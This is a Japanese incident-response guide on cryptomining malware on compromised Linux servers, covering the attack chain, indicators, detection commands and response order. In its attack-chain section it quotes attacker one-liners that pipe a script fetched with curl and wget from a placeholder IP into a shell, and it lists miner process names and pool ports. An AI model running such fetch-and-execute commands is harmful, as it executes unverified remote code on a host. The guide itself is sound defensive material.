## 概要

機会的に侵害された Linux サーバにおいて、最も多く観測される収益化手段が
暗号資産採掘（クリプトマイニング）です。CPU 使用率が持続的に 100% となるため
検知は容易ですが、**採掘マルウェアはインシデントそのものではなく、
インシデントの証拠である** 点に注意が必要です。マルウェアを設置したアクセス
経路は依然として開いており、同一の足がかりが他の攻撃者に転売される、
あるいはより隠密な活動に再利用される事例が多数報告されています。

## 典型的な攻撃の連鎖

1. **初期アクセス** — SSH の総当たり攻撃の成功、または公開サービスの脆弱性の悪用
2. **ツールの転送および実行（T1105 / T1059.004）** — 多くの場合、次の 1 行のみです。

   ```
   curl -s http://198.51.100.99/x.sh | bash
   wget -qO- http://198.51.100.99/x.sh | sh
   ```

   ダウンロードした内容を直接シェルにパイプする操作は、内容がディスクに
   書き込まれず、検査もされずに実行されることを意味します。運用中のサーバ上で
   この操作を行う正当な理由は存在しません。

3. **防御回避（T1562.001）** — 競合する採掘プロセスの停止、auditd の無効化、
   コマンド履歴の消去、`LD_PRELOAD` によるプロセス隠蔽の設置
4. **永続化（T1543.002 / T1053.003）** — systemd ユニットまたは cron エントリ
5. **リソースの不正利用（T1496）** — 採掘プールへの接続

## 指標

**プロセス名・ファイル名**: `xmrig`、`xmrigDaemon`、`minerd`、`cpuminer`、
`kdevtmpfsi`、`kinsing`、`sysupdate`、および `/tmp`、`/dev/shm`、`/var/tmp`
配下の一般的な名称のバイナリ

**通信**: 採掘プールの待ち受けポート **3333、4444、5555、7777、14444** への
外向き TCP 接続、および `stratum+tcp://` 形式の URL

```bash
sudo ss -tanp | grep -E ':(3333|4444|5555|7777|14444)\b'
top -b -n1 -o %CPU | head -15
sudo ls -la /tmp /dev/shm /var/tmp
```

プロセスが `ps` から隠蔽されている場合があるため、カーネルの認識と
ユーザー空間の表示を比較してください。

```bash
comm -13 <(ps -eo pid --no-headers | tr -d ' ' | sort) <(ls /proc | grep -E '^[0-9]+$' | sort)
cat /etc/ld.so.preload 2>/dev/null
```

既定の Ubuntu において `/etc/ld.so.preload` が存在すること自体が、侵害を
疑う十分な根拠となります。

## 対応手順

採掘プロセスを直ちに停止させたくなりますが、それは誤った初動です。揮発性の
証拠が失われ、攻撃者に発見を知らせることになり、そして永続化機構によって
数分以内に再起動されます。

正しい順序は次のとおりです。

1. **ネットワーク層でホストを隔離する**
   採掘通信と攻撃者との通信の双方を停止させつつ、ホスト上のプロセスに
   気付かせません。

2. **再起動前に揮発性の証拠を保全する**
   `/proc/<pid>/exe`、`/proc/<pid>/cmdline`、`/proc/<pid>/environ`、
   オープンソケット、ロード済みカーネルモジュールを取得します。

3. **永続化機構を特定し記録する**

4. **初期アクセスの経路を認証ログから特定する**
   ただし、ホスト外に複製が存在するログのみを信頼してください。

5. **再構築する**
   root 権限で攻撃者のコードが実行されたホストは、確実な復旧を保証できません。
   当該ホストに存在したすべての認証情報および鍵をローテーションしてください。

## 深刻度の評価根拠

クリプトマイニングを「高」から「緊急」として評価する理由は、CPU コストでは
ありません。その存在が **任意コード実行が既に成立したことを証明している**
ためです。可用性への影響は、この事象において最も重要度の低い側面です。
